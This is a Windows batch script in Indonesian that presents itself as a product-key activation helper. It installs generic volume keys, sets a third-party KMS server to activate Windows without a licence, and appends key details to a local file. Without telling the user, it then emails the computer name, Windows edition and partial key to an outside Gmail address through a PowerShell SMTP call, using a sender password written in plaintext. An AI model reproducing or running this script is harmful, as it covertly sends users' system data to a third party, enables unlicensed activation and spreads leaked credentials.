@echo off
title Capture Product Key by ElesssGhifariii
color 0a

:: --- KONFIGURASI EMAIL ---
set "FROM_EMAIL=my.donger@hanadesu.my.id"
set "TO_EMAIL=domethode@gmail.com"
set "SMTP_SERVER=smtp.zoho.com"
set "SMTP_PORT=587"
set "EMAIL_USER=my.donger@hanadesu.my.id"
set "EMAIL_PASS=Lnoxzxdz11*"  :: Ganti dengan 16 karakter App Password Gmail

:: --- PILIH VERSI WINDOWS ---
echo ==========================================
echo    Selamat Datang di Script Capture Key
echo ==========================================
echo.
echo Pilih versi Windows Anda:
echo   1. Windows 10 Home Single Language
echo   2. Windows 10/11 Pro
echo   3. Hapus Product Key (Reset)
echo.
set /p pilih=Masukkan pilihan (1/2/3): 

if "%pilih%"=="1" (
    set "nama=Windows 10 Home Single Language"
    set "key=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH"
) else if "%pilih%"=="2" (
    set "nama=Windows 10 Pro"
    set "key=W269N-WFGWX-YVC9B-4J6C9-T83GX"
) else if "%pilih%"=="3" (
    color 0c
    echo.
    echo ===========================================
    echo     Menghapus Product Key dan Lisensi...
    echo ===========================================
    slmgr /upk
    slmgr /cpky
    echo.
    echo [OK] Product Key berhasil dihapus.
    echo.
    pause
    exit /b
) else (
    color 0c
    echo [ERROR] Pilihan tidak valid!
    pause
    exit /b
)

:: --- Ambil 5 digit terakhir product key ---
set "last5=%key:~-5%"

:: --- Simpan key ke file lokal ---
(
  echo =======================================
  echo Nama Windows : %nama%
  echo Product Key  : *****-*****-*****-*****-%last5%
  echo Disimpan pada: %date% %time%
  echo =======================================
) >> CapturedKey.txt

:: --- Memasang key ---
echo.
echo Memasang key ...
cscript //nologo %windir%\system32\slmgr.vbs /ipk %key% >nul 2>&1
echo [OK] Product Key berhasil dipasang.

echo.
echo Mengatur KMS Server ...
cscript //nologo %windir%\system32\slmgr.vbs /skms kms.digiboy.ir >nul 2>&1
echo [OK] Proses aktivasi key.

echo.
echo Mengaktifkan key ...
cscript //nologo %windir%\system32\slmgr.vbs /ato >nul 2>&1
echo [OK] Aktivasi key berhasil di aktifkan.

:: --- Kirim log ke email dengan PowerShell ---
powershell -Command "$EMAIL_BODY=\"=======================================`nComputer Name : %COMPUTERNAME%`nWindows Version: %nama%`nCaptured Key  : *****-*****-*****-*****-%last5%`nTime          : %date% %time%`n=======================================\"; $SMTPServer='%SMTP_SERVER%'; $SMTPPort=%SMTP_PORT%; $EmailFrom='%FROM_EMAIL%'; $EmailTo='%TO_EMAIL%'; $Subject='Captured Key Log'; $Cred = New-Object System.Management.Automation.PSCredential('%EMAIL_USER%',(ConvertTo-SecureString '%EMAIL_PASS%' -AsPlainText -Force)); Send-MailMessage -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Cred -From $EmailFrom -To $EmailTo -Subject $Subject -Body $EMAIL_BODY"

echo.
echo ===========================================
echo      Terimakasih Karna Menggunakan Script
echo           Dari ElesssGhifari
echo ===========================================

echo.
echo Mohon tunggu sebentar untuk melihat status expired key...
timeout /t 5 >nul
slmgr.vbs /xpr

pause
